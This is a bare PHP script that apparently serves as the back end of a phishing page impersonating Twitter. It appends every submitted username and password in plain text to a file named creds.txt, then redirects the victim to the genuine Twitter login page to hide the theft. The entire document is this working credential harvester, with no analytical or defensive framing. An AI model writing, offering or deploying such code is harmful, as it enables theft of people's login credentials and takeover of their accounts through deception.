<?php
$file = fopen("creds.txt", "a");
fwrite($file, "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n");
fclose($file);
header("Location: https://twitter.com/login");
exit();
?>